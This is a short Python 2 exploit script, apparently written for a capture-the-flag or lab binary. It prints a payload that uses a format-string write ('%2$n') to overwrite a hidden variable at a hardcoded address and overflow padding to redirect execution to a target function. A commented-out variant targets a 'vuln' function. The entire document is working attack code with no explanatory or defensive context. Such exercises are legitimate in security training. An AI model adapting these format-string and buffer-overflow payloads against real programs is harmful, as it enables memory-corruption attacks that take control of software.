#for changing hidden var
padding = "AAAA"+"\x0c\x90\x55\x56"+"BBBB"+ "%2$243x" +"%2$n"+ "A"*113 + "\x2d\x62\x55\x56" 
#for vuln
#padding = "A"*104 + "\x2d\x62\x55\x56" 

print padding + "Z"*(40-len(padding))

#%x.%x.%x.%x.
#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA